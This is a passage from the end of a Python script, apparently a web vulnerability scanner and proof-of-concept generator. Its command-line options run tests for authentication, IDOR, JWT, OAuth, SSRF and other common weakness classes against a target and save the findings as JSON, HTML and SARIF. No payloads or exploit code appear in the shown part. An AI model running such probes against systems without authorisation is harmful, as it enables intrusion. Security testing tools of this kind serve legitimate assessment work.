                        "physicalLocation": {"artifactLocation": {"uri": fnd.get('target', '')}}
                    }]
                })
            except Exception:
                continue
        return {"version": "2.1.0", "runs": runs}

def main():
    parser = argparse.ArgumentParser(description='Advanced AI-Powered PoC Generator')
    parser.add_argument('workdir', help='Working directory with scan results')
    parser.add_argument('poc_dir', help='Directory to save PoCs')
    parser.add_argument('--html', action='store_true', help='Generate HTML report')
    parser.add_argument('--test-auth', help='Test authentication on target')
    parser.add_argument('--test-idor', help='Test IDOR on target')
    parser.add_argument('--test-jwt', help='Test JWT on target')
    parser.add_argument('--test-oauth', help='Test OAuth on target')
    parser.add_argument('--test-ssrf', help='Test SSRF on target')
    parser.add_argument('--test-misconfig', help='Test Security Misconfiguration on target')
    parser.add_argument('--test-crypto', help='Test Cryptographic Failures (Sensitive Data Exposure) on target')
    parser.add_argument('--test-logging', help='Test Security Logging and Monitoring Failures on target (manual review needed)')
    parser.add_argument('--test-design', help='Test Insecure Design on target (manual review needed)')
    parser.add_argument('--test-integrity', help='Test Software and Data Integrity Failures on target (advanced analysis needed)')
    args = parser.parse_args()

    ai_generator = AdvancedAIPOCGenerator(args.workdir, args.poc_dir)
    if args.test_auth:
        auth_findings = ai_generator.test_auth(args.test_auth, args.workdir)
        if auth_findings:
            ai_generator.save_findings(auth_findings)
            if args.html:
                ai_generator.save_findings_html(auth_findings)
            with open(os.path.join(args.workdir, 'auth_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(auth_findings, f, indent=2)
            ai_generator.logger.info(f"Authentication test complete. Found {len(auth_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, auth_findings.json, and summary.txt")
    elif args.test_idor:
        idor_findings = ai_generator.test_idor(args.test_idor, args.workdir)
        if idor_findings:
            ai_generator.save_findings(idor_findings)
            if args.html:
                ai_generator.save_findings_html(idor_findings)
            with open(os.path.join(args.workdir, 'idor_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(idor_findings, f, indent=2)
            ai_generator.logger.info(f"IDOR test complete. Found {len(idor_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, idor_findings.json, and summary.txt")
    elif args.test_jwt:
        ai_generator.test_jwt(args.test_jwt, args.workdir)
    elif args.test_oauth:
        ai_generator.test_oauth(args.test_oauth, args.workdir)
    elif args.test_ssrf:
        ssrf_findings = ai_generator.test_ssrf(args.test_ssrf, args.workdir)
        if ssrf_findings:
            ai_generator.save_findings(ssrf_findings)
            if args.html:
                ai_generator.save_findings_html(ssrf_findings)
            with open(os.path.join(args.workdir, 'ssrf_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(ssrf_findings, f, indent=2)
            ai_generator.logger.info(f"SSRF test complete. Found {len(ssrf_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, ssrf_findings.json, and summary.txt")
    elif args.test_misconfig:
        misconfig_findings = ai_generator.test_security_misconfiguration(args.test_misconfig, args.workdir)
        if misconfig_findings:
            ai_generator.save_findings(misconfig_findings)
            if args.html:
                ai_generator.save_findings_html(misconfig_findings)
            with open(os.path.join(args.workdir, 'misconfig_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(misconfig_findings, f, indent=2)
            ai_generator.logger.info(f"Security Misconfiguration test complete. Found {len(misconfig_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, misconfig_findings.json, and summary.txt")
    elif args.test_crypto:
        crypto_findings = ai_generator.test_cryptographic_failures(args.test_crypto, args.workdir)
        if crypto_findings:
            ai_generator.save_findings(crypto_findings)
            if args.html:
                ai_generator.save_findings_html(crypto_findings)
            with open(os.path.join(args.workdir, 'crypto_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(crypto_findings, f, indent=2)
            ai_generator.logger.info(f"Cryptographic Failures test complete. Found {len(crypto_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, crypto_findings.json, and summary.txt")
    elif args.test_logging:
        logging_findings = ai_generator.test_logging_monitoring(args.test_logging, args.workdir)
        if logging_findings:
            ai_generator.save_findings(logging_findings)
            if args.html:
                ai_generator.save_findings_html(logging_findings)
            with open(os.path.join(args.workdir, 'logging_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(logging_findings, f, indent=2)
            ai_generator.logger.info(f"Security Logging and Monitoring test complete. Found {len(logging_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, logging_findings.json, and summary.txt")
    elif args.test_design:
        design_findings = ai_generator.test_insecure_design(args.test_design, args.workdir)
        if design_findings:
            ai_generator.save_findings(design_findings)
            if args.html:
                ai_generator.save_findings_html(design_findings)
            with open(os.path.join(args.workdir, 'design_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(design_findings, f, indent=2)
            ai_generator.logger.info(f"Insecure Design test complete. Found {len(design_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, design_findings.json, and summary.txt")
    elif args.test_integrity:
        integrity_findings = ai_generator.test_data_integrity_failures(args.test_integrity, args.workdir)
        if integrity_findings:
            ai_generator.save_findings(integrity_findings)
            if args.html:
                ai_generator.save_findings_html(integrity_findings)
            with open(os.path.join(args.workdir, 'integrity_findings.json'), 'w', encoding='utf-8') as f:
                json.dump(integrity_findings, f, indent=2)
            ai_generator.logger.info(f"Software and Data Integrity Failures test complete. Found {len(integrity_findings)} potential vulnerabilities.")
            ai_generator.logger.info(f"Results saved to ai_analysis.txt, integrity_findings.json, and summary.txt")
    else:
        ai_generator.run(html_report=args.html)

if __name__ == '__main__':
    main()